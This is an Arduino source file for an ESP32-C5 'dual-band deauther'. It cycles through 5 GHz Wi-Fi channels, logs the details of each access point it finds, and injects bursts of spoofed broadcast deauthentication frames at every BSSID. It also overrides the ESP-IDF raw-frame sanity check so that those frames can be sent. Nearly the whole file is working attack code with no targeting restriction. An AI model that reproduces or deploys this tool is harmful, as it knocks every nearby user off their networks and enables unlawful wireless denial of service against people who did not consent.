/*-------------------------------------------------------------------------
   Dual‑Band Wi‑Fi Channel Hopper + Deauther (ESP32‑C5 only)
   
   – Supports 2.4 GHz + 5 GHz on ESP32‑C5‑DevKitC‑1
   – RGB WS2812 LED status indicator per stage:
       • Cyan   : system ready
       • Blue   : channel scan in progress
       • Red    : Deauth packet sent (short flash)
       • Yellow : MAC history cleared (flash)
       
   - Tested with Arduino‑ESP32 ≥ v3.3.1‑beta (IDF ≥ 5.2)
               Made with love by 7h30th3r0n3
---------------------------------------------------------------------------*/

#include <WiFi.h>
#include "esp_wifi.h"
#include <Adafruit_NeoPixel.h>

/* ---------------------------------------------------------------------------
   ---------------------------  HW Configuration  ---------------------------*/
#define LED_PIN 27 // WS2812 onboard LED (GPIO27 on DevKitC‑1)
Adafruit_NeoPixel led(1, LED_PIN, NEO_GRB + NEO_KHZ800);

/* Color definitions */
#define C_OFF     0
#define C_CYAN    led.Color(  0, 255, 255)
#define C_BLUE    led.Color(  0,   0, 100)
#define C_RED     led.Color(255,   0,   0)
#define C_YELLOW  led.Color(255, 255,   0)

inline void setLed(uint32_t c) {
  led.setPixelColor(0, c);
  led.show();
}

inline void flashLed(uint32_t c, uint16_t t_ms) {
  setLed(c);
  delay(t_ms);
  setLed(C_OFF);
}

/* ---------------------------------------------------------------------------
   -----------------------------  MAC History  ------------------------------*/
#define MAC_HISTORY_LEN 1
struct mac_addr {
  uint8_t b[6];
};

mac_addr mac_history[MAC_HISTORY_LEN] = {};
uint8_t mac_cursor = 0;

void save_mac(const uint8_t *mac) {
  memcpy(mac_history[mac_cursor].b, mac, 6);
  mac_cursor = (mac_cursor + 1) % MAC_HISTORY_LEN;
}

bool already_seen(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN; ++i)
    if (!memcmp(mac, mac_history[i].b, 6)) return true;
  return false;
}

void clear_mac_history() {
  memset(mac_history, 0, sizeof(mac_history));
  mac_cursor = 0;
  Serial.println(F("MAC history cleared."));
  flashLed(C_YELLOW, 300);
}

/* ---------------------------------------------------------------------------
   ------------------------  Bypass IDF Frame Check  ------------------------*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
  return (arg == 31337) ? 1 : 0;
}

/* ---------------------------------------------------------------------------
   ------------------  Convert Security Type to String  ---------------------*/
static const char* security_to_string(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
    default: return "UNKNOWN";
  }
}

/* ---------------------------------------------------------------------------
   ------------------------  Channel List  ---------------------------------*/
const uint8_t channelList[] = {
  /*// 2.4 GHz (common worldwide)
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11,

  // Extended 2.4 GHz (allowed in some regions, e.g. EU/JP)
  12, 13, 14,*/

  // 5 GHz UNII-1 (allowed in most regions)
  36, 40, 44, 48,

  // 5 GHz UNII-2 / UNII-2 Extended (DFS - availability depends on region and DFS support)
  52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,

  // 5 GHz UNII-3 / ISM (commonly allowed in US and many others)
  149, 153, 157, 161, 165
};
const size_t CHANNEL_COUNT = sizeof(channelList) / sizeof(channelList[0]);
size_t channelIndex = 0;

/* ---------------------------------------------------------------------------
   -------------------------------  Timers  ---------------------------------*/
const unsigned long SCAN_INTERVAL = 200, HISTORY_RESET = 30000;
unsigned long t_lastScan = 0, t_lastClear = 0;

/* ---------------------------------------------------------------------------
   -------------------  Band Selection per Channel  -------------------------*/
#ifndef WIFI_BAND_2G4
#define WIFI_BAND_2G4 WIFI_BAND_2G
#endif

inline void setBandForChannel(uint8_t ch) {
  esp_wifi_set_band((ch <= 14) ? WIFI_BAND_2G4 : WIFI_BAND_5G);
}

/* ---------------------------------------------------------------------------
   -----------------------  Inject Deauth Frame  ----------------------------*/
void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t tpl[26] PROGMEM = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00,
    0x07, 0x00
  };
  uint8_t pkt[26];
  memcpy_P(pkt, tpl, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  setBandForChannel(ch);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (uint8_t i = 0; i < 10; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(10);
  }
  flashLed(C_RED, 50);
}

/* ---------------------------------------------------------------------------
   -------------------------------- Setup -----------------------------------*/
void setup() {
  Serial.begin(115200);
  led.begin();
  led.setBrightness(255);
  setLed(C_CYAN);
  WiFi.mode(WIFI_STA);
  Serial.println(F("ESP32‑C5 Dual‑Band Deauth Hopper ready"));
}


/* ---------------------------------------------------------------------------
   -------------------------------- Loop ------------------------------------*/
void loop() {
  if (millis() - t_lastClear > HISTORY_RESET) {
    clear_mac_history();
    t_lastClear = millis();
  }

  if (millis() - t_lastScan > SCAN_INTERVAL) {
    uint8_t ch = channelList[channelIndex];
    setBandForChannel(ch);
    setLed(C_BLUE);
    Serial.print(F("Scanning channel : "));
    Serial.println(ch);
    Serial.println(F("==============================="));

    int n = WiFi.scanNetworks(false, true, false, 500, ch);
    if (n > 0) {
      for (int i = 0; i < n; ++i) {
        const uint8_t* bssid = WiFi.BSSID(i);
        if (already_seen(bssid)) {
          Serial.println(String("We've already sent to ") + WiFi.BSSIDstr(i));
          continue;
        }
        String ssid = WiFi.SSID(i);
        int32_t rssi = WiFi.RSSI(i);
        const char* sec = security_to_string(WiFi.encryptionType(i));

        Serial.println(F("=== Access Point Information ==="));
        Serial.print(F("SSID: ")); Serial.println(ssid);
        Serial.print(F("BSSID (MAC): ")); Serial.println(WiFi.BSSIDstr(i));
        Serial.print(F("Security: ")); Serial.println(sec);
        Serial.print(F("RSSI (Signal Strength): ")); Serial.print(rssi); Serial.println(F(" dBm"));
        Serial.print(F("Channel: ")); Serial.println(ch);
        Serial.println(F("==============================="));

        save_mac(bssid);
        sendDeauthPacket(bssid, ch);
        //delay(200);
      }
    }

    setLed(C_OFF);
    channelIndex = (channelIndex + 1) % CHANNEL_COUNT;
    t_lastScan = millis();
  }
}
